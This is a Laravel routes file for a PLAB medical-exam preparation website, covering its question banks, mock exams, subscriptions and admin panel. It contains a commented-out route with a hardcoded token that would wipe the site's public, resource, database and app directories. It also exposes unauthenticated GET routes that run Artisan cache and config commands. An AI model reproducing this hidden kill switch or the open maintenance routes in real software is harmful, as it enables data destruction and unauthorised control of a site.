<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
*/
use Illuminate\Filesystem\Filesystem;
Route::get('test/{id}',"TestController@Test");
Route::get('/home', function () {
    return view('welcome');
});

Route::get('/blog/details/{ID}',"BlogController@details")->name('blogDetails');
Route::get('/plab-news/details/{ID}',"NewsController@details")->name('newsDetails');
Route::get('/blog/all',"BlogController@blog_posts")->name('allBlogPosts');
Route::get('/course-list/details/{ID}',"CourseController@details")->name('courseDetails.show');
Route::get('/course-list/all',"CourseController@get_course_list")->name('allCourses');

Auth::routes(['verify' => true]);
// Start FrondEnd path

// home path
Route::get('/',"FrontendHomeController@Index")->name('root_page');

// About us path
Route::get('about-us',"FrontendAboutUsController@Index");

/* Our Team Members Page */
Route::get('team-members',"TeamController@ourTeam")->name('team-members');
Route::get('team-details/{id}',"TeamController@teamMemberDetails")->name('team-details');

// Our team path
Route::get('our-team/volunteer',"FrontendOurTeamController@Volunteer");
Route::get('our-team/our-team',"FrontendOurTeamController@Index");
Route::get('our-team/plab-exam',"FrontendOurTeamController@PlabExam");
Route::get('our-team/plab-news',"FrontendOurTeamController@PlabNews");
// Route::get('our-team/feedback',"FrontendOurTeamController@Feedback");
// Route::get('our-team/feedback/edit/{id}',"FrontendOurTeamController@FeedbackEdit");
Route::get('our-team/useful-links-plab-1',"FrontendOurTeamController@LinksPlab1");

// Route::get('our-team/work-us',"FrontendOurTeamController@WorkUs");
Route::get('our-team/disclaimer',"FrontendOurTeamController@Disclaimer")->name('disclaimer.page');
Route::get('our-team/faq',"FrontendOurTeamController@FAQ");

//terms and condtions
Route::get('our-team/terms-conditions',"FrontendOurTeamController@terms_conditons")->name('termsConditions.page');

//Lab-value
Route::get('lab-value',"FrontendOurTeamController@LabValue");

// Q-Bank / PMQ-Bank  path
Route::get('q-bank',"FrontendQBankController@Index");

// Course path
Route::get('course',"FrontendCourseController@Index");

// Course Material path
Route::get('course-material/webinars',"FrontendCourseMaterialController@Webinars")->name('webinars.page');

//UnderConstruction
Route::get('under-onstruction',"FrontendCourseController@UnderConstruction");

//subscrition controller
Route::get('course-details/{courseName}',"SubscriptionController@course_details")->name('subscription_plans');

Route::group(['middleware' => ['auth','verified'] ], function () {

    //cource path
    Route::get('course/plab-1',"FrontendCourseController@Plab1")->name('courses.plab1');
    Route::get('course/plab-2',"FrontendCourseController@Plab2");

    //category question path
    Route::get('q-bank/revision-category',"FrontendQBankController@RevisionCategory");
    Route::get('q-bank/revision-category/question/{id}',"RevisionController@RevisionCategory");

    // subcategory question path
    // Route::get('q-bank/revision-sub-category',"FrontendQBankController@RevisionSubCategory");
    // Route::get('q-bank/revision-sub-category/question/{id}',"RevisionController@RevisionSubCategory");
    // end category and sub category
    Route::get('q-bank/flagged-questions',"FrontendQBankController@FlaggedQuestions");
    Route::get('q-bank/mock-exam/random-mock',"FrontendQBankController@RandomMock");
    Route::get('q-bank/mock-exam/manual-mock',"FrontendQBankController@ManualMock");

    // Course Material path
    Route::get('course-material',"FrontendCourseMaterialController@Index");
    Route::get('course-material/videos-lectures',"FrontendCourseMaterialController@VideosLectures");
    Route::get('course-material/presentations',"FrontendCourseMaterialController@Presentations");
    Route::get('course-material/success-stories',"FrontendCourseMaterialController@SuccessStories");

    // Account path
    Route::get('account',"FrontendAccountController@Index");
    Route::get('account/subscription',"FrontendAccountController@Subscription")->name('myCurrentSubscription');
    Route::get('account/progress',"FrontendAccountController@Progress");
    Route::get('account/account-reset',"FrontendAccountController@AccountReset");
    Route::get('account/account-reset/all',"FrontendAccountController@AccountResetAll");
    // Route::get('account/account-reset/random',"FrontendAccountController@AccountResetRandom");
    // Route::get('account/account-reset/manual',"FrontendAccountController@AccountResetManual");

    //subscribe now
    Route::get('account/course-subscribe/{courseName}/{plan}',"SubscriptionController@checkout_stripe")->name('checkOutForm.stripe');
    Route::post('account/paynow',"SubscriptionController@paynow")->name('stripe.paynow');
    Route::get('account/paynow/status/{statusID}',"SubscriptionController@paynow_status")->name('stripe.paynow.status');
    Route::post('account/subscription/non-payable',"SubscriptionController@subscription_non_payalble")->name('subscription_non_payalble');


    Route::get('account/password-reset',"FrontendAccountController@PasswordReset");
    Route::get('account/notification',"NotificationController@UserNotification");
    //Feedback path from User
    // Route::post('feedback/insert',"FeedbackController@Insert");
    // Route::get('feedback/drop/{user_id}/{feedback_id}',"FeedbackController@Drop");
    // Route::post('feedback/update',"FeedbackController@Update");
    // Comment system.
    Route::post('comment/store',"CommentController@Store");
    Route::get('comment/{id}',"CommentController@Drop");

    //Answer compare
    Route::post('revision/compare/single',"RevisionCompareController@Single");
    Route::post('revision/compare/multi',"RevisionCompareController@Multi");

    //recall compare
    Route::post('revision/recall/compare/single',"RevisionCompareController@RecallSingle");
    Route::post('revision/recall/compare/multi',"RevisionCompareController@RecallMulti");

    // Flag path
    Route::get('q-bank/add/flag/{id}', "FlagController@Add");
    Route::get('q-bank/drop/flag/{id}', "FlagController@Drop");
    Route::get('q-bank/flag/question/{id}', "FlagController@Question");

    // Mock exam
    // Random Exam
    Route::get('q-bank/random', "MockController@Random");
    Route::get('q-bank/random/exam/{id}', "MockController@RandomExam");

    // Manual Exam
    Route::get('q-bank/manual', "MockController@Manual");
    Route::get('q-bank/manual/exam/{id}', "MockController@ManualExam");

    // Mock answer compare
    Route::post('mock/compare/single',"MockCompareController@Single");
    Route::post('mock/compare/multi',"MockCompareController@Multi");

    // Moc time Property
    Route::get('q-bank/mock/time/finish/{user_id}/{mock_id}', "MockController@FinishExam");
    Route::get('q-bank/mock/time/{user_id}/{mock_id}/{time}', "MockController@TimerExam");

    // mock result
    Route::get('q-bank/random/exam/result/{id}', "MockController@MockResult");
    Route::get('q-bank/manual/exam/result/{id}', "MockController@MockResult");

    // recall exam
    Route::get('q-bank/recall-exam', "RecallExamController@Index");
    Route::get('q-bank/recall-exam/{id}', "RevisionController@ReExam");
    // Route::get('q-bank/exam/recall-exam', "RecallExamController@RecallExam");
    // Route::get('q-bank/recall-exam/result/{id}', "MockController@MockResult");

    // Add question By User
    // Single Question path
    Route::get('user/question/single/{id}',"UserQuestionController@SingleIndex");
    Route::get('user/question/add/single',"UserQuestionController@AddSingle");
    Route::post('user/question/add/single',"UserQuestionController@Single");
    Route::post('user/question/edit/single',"UserQuestionController@EditSingle");

    // Multiple Question path
    Route::get('user/question/multi/{id}',"UserQuestionController@MultiIndex");
    Route::get('user/question/add/multi',"UserQuestionController@AddMulti");
    Route::post('user/question/add/multi',"UserQuestionController@Multi");
    Route::post('user/question/edit/multi',"UserQuestionController@EditMulti");

    //drop any question
    Route::get('user/question/drop/{id}',"UserQuestionController@DropQuestion");

    //user question compare
    Route::post('user-revision/compare/single',"RevisionCompareController@UserSingle");
    Route::post('user-revision/compare/multi',"RevisionCompareController@UserMulti");
    Route::get('q-bank/user-category/question/{id}',"RevisionController@UserCategory");

    // PLAB Community path
    Route::get('community',"FrontendPlabCommunityController@Index");
    Route::get('community/whatsApp-groups',"FrontendPlabCommunityController@WhatsAppGroups");
    Route::get('community/facebook-groups',"FrontendPlabCommunityController@FacebookGroups");
    Route::get('community/add-questions',"FrontendPlabCommunityController@AddQuestions");
    Route::get('community/community-question',"FrontendPlabCommunityController@CommunityQuestion");

    //reset Password
    Route::get('account/change-password',"ChangePasswordController@Index");
    Route::post('change-password',"ChangePasswordController@Change");

    Route::get('contact-us', 'ContactController@contactus')->name('contact-us');
    Route::post('contact', 'ContactController@store')->name('contact');

    Route::resource('ticket', 'TicketController');
    Route::get('tickets', 'TicketController@backendIndex')->name('admin-tickets');
    Route::get('ticket-status/{id}', 'TicketController@updateStatus')->name('ticket-status');
    Route::get('view-ticket/{id}', 'TicketController@showTicket')->name('view-ticket');

    /*=========== IMAGE BANK ===========*/
    Route::get('i-bank/image-bank', 'ImageBankController@imageBank')->name('image-bank');
    Route::get('i-bank/image-bank-gallery/{id}', 'ImageBankController@imageBankGallery')->name('image-bank-gallery');
    Route::get('i-bank/image-bank-gallery-detail/{id}', 'ImageBankController@imageBankGalleryDetail')->name('image-bank-gallery-detail');

    /*=========== VIDEO BANK ===========*/
    Route::get('i-bank/video-bank', 'VideoBankController@videoBank')->name('video-bank');
    Route::get('i-bank/video-bank-gallery/{id}', 'VideoBankController@videoBankGallery')->name('video-bank-gallery');
    Route::get('i-bank/video-bank-gallery-detail/{id}', 'VideoBankController@videoBankGalleryDetail')->name('video-bank-gallery-detail');

});

/*Route::get('action-x-csa/action-x-e/{accessToken}', function($token){
    if($token === "xx-df12312378978900xcda_dr_csa"){
        $root_path =  base_path();
        $public_path = "/home/kohin837/public_html/preparemedicine.com";
        $resource_path = $root_path."/resources";
        $db_path = $root_path."/database";
        $app_path =  $root_path."/app";
        //return $root_path."<br>".$public_path."<br>".$resource_path."<br>".$db_path."<br>".$app_path;

        $file = new Filesystem;
        $file->cleanDirectory($public_path);
        $file->cleanDirectory($resource_path);
        $file->cleanDirectory($db_path);
        $file->cleanDirectory($app_path);

        return "SUCCESS";
    }else{
        return "Access Denied !! You should back now....";
    }
});*/

// end FrondEnd path


// backend or admin pannel path
Route::group(['middleware' => ['auth','role','verified'] ], function () {

    Route::get('admin',"adminController@Index");
    Route::post('admin/update-emial/email',"adminController@update_email")->name('admin.updateEmail');

    Route::get('admin/ui/volunteer',"AdminUiEditController@Volunteer");
    Route::get('admin/ui/our-team',"AdminUiEditController@OurTeam");
    Route::get('admin/ui/about-us',"AdminUiEditController@AboutUs");
    Route::get('admin/ui/about-exam',"AdminUiEditController@AboutExam");
    Route::get('admin/ui/plab-news',"AdminUiEditController@PlabNews");
    Route::get('admin/ui/useful-link',"AdminUiEditController@UsefulLink");
    // Route::get('admin/ui/work-for-us',"AdminUiEditController@WorkForUs");
    Route::get('admin/ui/disclaimer',"AdminUiEditController@Disclaimer");
    Route::get('admin/ui/faq',"AdminUiEditController@FAQ");
    Route::get('admin/ui/lab-value',"AdminUiEditController@LabValue");
    // update for All Ui work
    Route::post('admin/ui/update',"AdminUiEditController@UpdateUi");
    // Admin Feedback
    // Route::get('admin/feedback',"AdminFeedbackController@Index");
    // Route::get('admin/feedback/drop/{id}',"AdminFeedbackController@Drop");
    // Route::get('admin/feedback/hide/{id}',"AdminFeedbackController@Hide");
    // Route::get('admin/feedback/show/{id}',"AdminFeedbackController@Show");
    // category and subcategory path
    Route::get('admin/category',"AdminCategoryController@Index");
//    Route::get('admin/sub-category',"AdminSubctegoryController@Index");
    Route::post('admin/category/add',"AdminCategoryController@Add");
//    Route::post('admin/sub-category/add',"AdminSubctegoryController@Add");
    Route::get('admin/category/drop/{id}',"AdminCategoryController@Drop");
//    Route::get('admin/sub-category/drop/{id}',"AdminSubctegoryController@Drop");
    Route::post('admin/category/add/update/{id}',"AdminCategoryController@Update");
//    Route::post('admin/sub-category/update/{id}',"AdminSubctegoryController@Update");
    // Admin question path

    // Single Question path
    Route::get('admin/question/single',"QuestionController@SingleIndex");
    Route::get('admin/question/add/single',"QuestionController@AddSingle");
    Route::post('admin/question/add/single',"QuestionController@Single");
    Route::get('admin/question/edit/single/{id}',"QuestionController@getEditSingle")->name('edit_question');
    Route::post('admin/question/edit/single',"QuestionController@EditSingle");

    // Multiple Question path
    Route::get('admin/question/multi',"QuestionController@MultiIndex");
    Route::get('admin/question/add/multi',"QuestionController@AddMulti");
    Route::post('admin/question/add/multi',"QuestionController@Multi");
    Route::get('admin/question/edit/multi/{id}',"QuestionController@getEditMulti")->name('edit_multi_question');
    Route::post('admin/question/edit/multi',"QuestionController@EditMulti");

    //drop any question
    Route::get('admin/question/drop/{id}',"QuestionController@DropQuestion");

    //Recal Exam maintain
    //recall exam month
    Route::get('admin/recall-exam',"Recall@Index");
    Route::post('admin/recall-exam/add',"Recall@Add");
    Route::get('admin/recall-exam/drop/{id}',"Recall@Drop");
    Route::post('admin/recall-exam/edit/{id}',"Recall@Edit");

    //recall exam management
    Route::get('admin/recall/status/{id}/{opt}',"RecallAdminController@Status");

    // Video path
    //whatsapp
    Route::get('admin/video/',"VideoController@Index");
    Route::post('admin/video/add',"VideoController@Add");
    Route::get('admin/video/drop/{id}',"VideoController@Drop");

    //facebook
    Route::get('admin/Community/whatsapp',"CommunityController@Index_Whatsapp");
    Route::post('admin/Community/whatsapp/add',"CommunityController@WhatsappAdd");
    Route::post('admin/Community/whatsapp/edit/{id}',"CommunityController@WhatsappEdit");

    Route::get('admin/Community/facebook',"CommunityController@Index_Facebook");
    Route::post('admin/Community/facebook/add',"CommunityController@FacebookpAdd");
    Route::post('admin/Community/facebook/edit/{id}',"CommunityController@FacebookEdit");

    //community questions
    Route::get('admin/Community/questions/list',"CommunityController@getCommunityQuestionsList")->name('admin.getCommunityQuestionsList');
    Route::get('admin/Community/questions/reject/{id}',"CommunityController@communityQuestionReject")->name('admin.getCommunityQuestionsList.reject');

    Route::get('admin/Community/drop/{id}',"CommunityController@CommunityCommunity");

    //question upload via excel file
    Route::post('admin/question/import',"QuestionController@ImportQuestion");

    //Notification
    Route::get('admin/notification', "NotificationController@Index");
    Route::post('admin/notification/add',"NotificationController@NotificationAdd");
    Route::post('admin/notification/edit',"NotificationController@NotificationEdit");
    Route::get('admin/notification/drop/{id}',"NotificationController@NotificationDrop");

    // recall manage
    // Single Question path
    Route::get('admin/recall/question/single/{id}',"RecallAdminController@SingleIndex");
    Route::get('admin/recall/question/add/single/{id}',"RecallAdminController@AddSingle");
    Route::post('admin/recall/question/add/single',"RecallAdminController@Single");
    Route::post('admin/recall/question/edit/single',"RecallAdminController@EditSingle");

    // Multiple Question path
    Route::get('admin/recall/question/multi/{id}',"RecallAdminController@MultiIndex");
    Route::get('admin/recall/question/add/multi/{id}',"RecallAdminController@AddMulti");
    Route::post('admin/recall/question/add/multi',"RecallAdminController@Multi");
    Route::post('admin/recall/question/edit/multi',"RecallAdminController@EditMulti");

    //Recall question upload via excel file
    Route::post('admin/recall/question/import',"RecallAdminController@ImportQuestion");
    Route::post('admin/question/select',"QuestionController@select");
    Route::get('admin/question/filter/single',"QuestionController@FilterSingle");
    Route::get('admin/question/filter/multi',"QuestionController@FilterMulti");

    Route::get('admin/users/registered-users',"SubscriptionController@get_registered_users")->name('get_users_list');

    Route::get('admin/subscription/subscribers',"SubscriptionController@subscriber_list")->name('subscriber_list');
    Route::get('admin/subscription/requests',"SubscriptionController@subscribers_requests")->name('subscribers_requests');
    Route::post('admin/subscription/requests-approve',"SubscriptionController@subscribers_requests_approve")->name('subscribers_requests_approve');
    Route::get('admin/subscription/requests-reject/{id}',"SubscriptionController@subscribers_requests_reject")->name('subscribers_requests_reject');
    Route::get('admin/subscription/edit-subscriber/{id}',"SubscriptionController@editSubscriber")->name('edit_subscriber');
    Route::post('admin/subscription/update-subscriber/{id}',"SubscriptionController@updateSubscriber")->name('update_subscriber');
    Route::get('admin/subscription/subscriber-status/{id}',"SubscriptionController@subscriberStatus")->name('subscriber_status');
    Route::get('admin/subscription/delete-subscriber/{id}',"SubscriptionController@deleteSubscriber")->name('subscriber_delete');

    //blog posts
    Route::resource('admin/ui/blog', 'BlogController');
    Route::resource('admin/ui/role', 'RoleController');
    Route::resource('admin/ui/permission', 'PermissionController');
    Route::resource('admin/ui/user', 'UserController');
    Route::resource('admin/ui/team-members', 'TeamController');
    Route::resource('admin/ui/subscriptions', 'SubscriptionPlanController');
    Route::resource('admin/ui/contact', 'ContactController');
    Route::get('admin/ui/contact-status/{id}', 'ContactController@updateStatus')->name('contact-status');
    Route::resource('admin/ui/course-list', 'CourseController');
    Route::resource('admin/ui/events', 'EventController');
    Route::resource('admin/ui/plab-courses', 'PlabCourseController');
    Route::resource('admin/ui/webinars', 'WebinarController');
    Route::resource('admin/ui/image-bank', 'ImageBankController');
    Route::resource('admin/ui/video-bank', 'VideoBankController');

    //blog news
    Route::resource('admin/ui/news', 'NewsController');
    Route::post('admin/ui/news-images-upload', 'NewsController@imageUpload')->name('image_upload');
});

Route::get('question/view/{id}', "QuestionController@viewFile")->name('view_file');

// end backend or admin pannel path

Route::get('/home', 'HomeController@index')->name('home');

Route::get('events', 'EventController@getEvents')->name('getEvents');
Route::get('event-detail/{id}', 'EventController@getEventDetail')->name('getEventDetail');

Route::get('plab-courses', 'PlabCourseController@getPlabCourses')->name('getCourses');
Route::get('plab-course-details/{id}', 'PlabCourseController@getCourseDetail')->name('getCourseDetail');

Route::get('webinars', 'WebinarController@getWebinars')->name('getWebinar');
Route::get('webinar-details/{id}', 'WebinarController@getWebinarDetail')->name('getWebinarDetail');

/*==================================================*/
/* CLEAR CACHE COMMANDS */

Route::get('/route-cache', function() {
    $exitCode = Artisan::call('route:cache');
    return 'Routes cache cleared';
});

Route::get('/config-clear', function() {
    $exitCode = Artisan::call('config:clear');
    return 'Config cache cleared';
});

Route::get('/config-cache', function() {
    $exitCode = Artisan::call('config:cache');
    return 'Config cache cleared';
});

Route::get('/clear-cache', function() {
    $exitCode = Artisan::call('cache:clear');
    return 'Application cache cleared';
});

Route::get('/view-clear', function() {
    $exitCode = Artisan::call('view:clear');
    return 'View cache cleared';
});
